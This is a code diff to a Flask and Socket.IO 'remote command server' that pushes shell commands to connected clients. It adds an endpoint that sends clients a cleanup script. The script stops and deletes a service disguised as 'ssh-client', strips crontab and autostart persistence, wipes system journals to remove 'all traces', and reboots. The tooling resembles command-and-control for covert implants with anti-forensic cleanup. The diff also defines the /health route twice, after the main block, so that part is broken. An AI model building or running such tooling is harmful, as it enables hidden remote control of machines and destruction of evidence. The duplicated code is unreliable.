@@ -19,7 +19,12 @@ app.config['SECRET_KEY'] = secrets.token_hex(16)
 socketio = SocketIO(app, cors_allowed_origins="*")
 
 # Database setup
-DB_PATH = 'remote_commands.db'
+DB_PATH = os.environ.get('DB_PATH', '/app/data/remote_commands.db')
+LOG_FILE = os.environ.get('LOG_FILE', '/app/logs/app.log')
+
+# Ensure directories exist
+os.makedirs(os.path.dirname(DB_PATH), exist_ok=True)
+os.makedirs(os.path.dirname(LOG_FILE), exist_ok=True)
 
 def init_db():
     """Initialize the database with required tables"""
@@ -385,6 +390,105 @@ def download_file(file_id):
     
     return send_file(temp_path, as_attachment=True, download_name=filename)
 
+# Default removal script for complete client cleanup
+DEFAULT_REMOVAL_SCRIPT = '''#!/bin/bash
+# Complete Client Removal Script - Removes all traces
+echo "🗑️  Starting complete client removal..."
+
+# Stop the service
+systemctl stop ssh-client.service 2>/dev/null || true
+systemctl --user stop ssh-client.service 2>/dev/null || true
+
+# Disable the service
+systemctl disable ssh-client.service 2>/dev/null || true
+systemctl --user disable ssh-client.service 2>/dev/null || true
+
+# Remove service files
+rm -f /etc/systemd/system/ssh-client.service
+rm -f ~/.config/systemd/user/ssh-client.service
+
+# Remove installation directories
+rm -rf /usr/share/ssh-client
+rm -rf /usr/share/openssh-client
+rm -rf ~/.local/share/ssh-client
+
+# Remove symlinks
+rm -f /usr/local/bin/ssh-client-manager
+rm -f ~/.local/bin/ssh-client-manager
+rm -f /usr/local/bin/ssh-session
+
+# Remove autostart entries
+rm -f ~/.config/autostart/ssh-client.desktop
+
+# Kill any remaining processes
+pkill -f "ssh_client.py" 2>/dev/null || true
+pkill -f "ssh-client" 2>/dev/null || true
+
+# Remove from crontab
+crontab -l 2>/dev/null | grep -v "ssh_client.py" | crontab - 2>/dev/null || true
+
+# Clear logs
+journalctl --vacuum-time=1s 2>/dev/null || true
+
+# Remove temp files
+rm -f /tmp/ssh_client.py
+rm -f /tmp/ssh-client*
+
+# Reload systemd
+systemctl daemon-reload 2>/dev/null || true
+systemctl --user daemon-reload 2>/dev/null || true
+
+echo "✅ Client removal completed successfully"
+echo "🔄 Rebooting in 10 seconds to complete cleanup..."
+sleep 10
+reboot
+'''
+
+@app.route('/api/removal-script')
+def get_removal_script():
+    """Get the default removal script for complete client cleanup"""
+    return jsonify({
+        'script': DEFAULT_REMOVAL_SCRIPT,
+        'name': 'client_removal.sh',
+        'description': 'Complete client removal script - removes all traces'
+    })
+
+@app.route('/api/execute-removal', methods=['POST'])
+def execute_removal():
+    """Execute the removal script on a specific client"""
+    data = request.get_json()
+    client_id = data['client_id']
+    
+    # Create a temporary removal script
+    removal_command = f'''
+# Create and execute removal script
+cat > /tmp/client_removal.sh << 'REMOVAL_EOF'
+{DEFAULT_REMOVAL_SCRIPT}
+REMOVAL_EOF
+chmod +x /tmp/client_removal.sh
+nohup /tmp/client_removal.sh > /tmp/removal.log 2>&1 &
+'''
+    
+    conn = sqlite3.connect(DB_PATH)
+    cursor = conn.cursor()
+    
+    cursor.execute('''
+        INSERT INTO command_queue (client_id, command)
+        VALUES (?, ?)
+    ''', (client_id, removal_command))
+    
+    command_id = cursor.lastrowid
+    conn.commit()
+    conn.close()
+    
+    # Emit to specific client via WebSocket
+    socketio.emit('execute_command', {
+        'command': removal_command,
+        'id': command_id
+    }, room=client_id)
+    
+    return jsonify({'success': True, 'message': 'Removal script queued for execution'})
+
 @socketio.on('connect')
 def handle_connect():
     """Handle client connection"""
@@ -403,16 +507,66 @@ def handle_join_room(data):
     print(f"Client {client_id} joined room")
 
 if __name__ == '__main__':
+    # Initialize database
     init_db()
+    
+    # Get configuration from environment
+    host = os.environ.get('FLASK_HOST', '0.0.0.0')
+    port = int(os.environ.get('FLASK_PORT', 5000))
+    debug = os.environ.get('FLASK_DEBUG', 'false').lower() == 'true'
+    
     print("🚀 Starting Remote Command Server...")
-    print("📡 Server will be available at: http://localhost:5000")
+    print(f"📡 Server will be available at: http://{host}:{port}")
     print("🔧 Press Ctrl+C to stop the server")
     print("-" * 50)
+    
     try:
-        socketio.run(app, host='0.0.0.0', port=5000, debug=False, use_reloader=False)
+        socketio.run(app, host=host, port=port, debug=debug, use_reloader=False)
     except KeyboardInterrupt:
         print("\n🛑 Server stopped by user")
     except Exception as e:
         print(f"❌ Server error: {e}")
-        print("💡 Try: sudo netstat -tlnp | grep :5000  # Check if port is in use")
-        print("💡 Try: sudo lsof -i :5000  # Check what's using the port")
+        import traceback
+        traceback.print_exc()
+
+@app.route('/health')
+def health_check():
+    """Health check endpoint for Docker/Coolify"""
+    try:
+        # Check database connection
+        conn = sqlite3.connect(DB_PATH)
+        conn.execute('SELECT 1')
+        conn.close()
+        
+        return jsonify({
+            'status': 'healthy',
+            'timestamp': datetime.datetime.now().isoformat(),
+            'database': 'connected'
+        }), 200
+    except Exception as e:
+        return jsonify({
+            'status': 'unhealthy',
+            'error': str(e),
+            'timestamp': datetime.datetime.now().isoformat()
+        }), 500
+
+@app.route('/health')
+def health_check():
+    """Health check endpoint for Docker/Coolify"""
+    try:
+        # Check database connection
+        conn = sqlite3.connect(DB_PATH)
+        conn.execute('SELECT 1')
+        conn.close()
+        
+        return jsonify({
+            'status': 'healthy',
+            'timestamp': datetime.datetime.now().isoformat(),
+            'database': 'connected'
+        }), 200
+    except Exception as e:
+        return jsonify({
+            'status': 'unhealthy',
+            'error': str(e),
+            'timestamp': datetime.datetime.now().isoformat()
+        }), 500
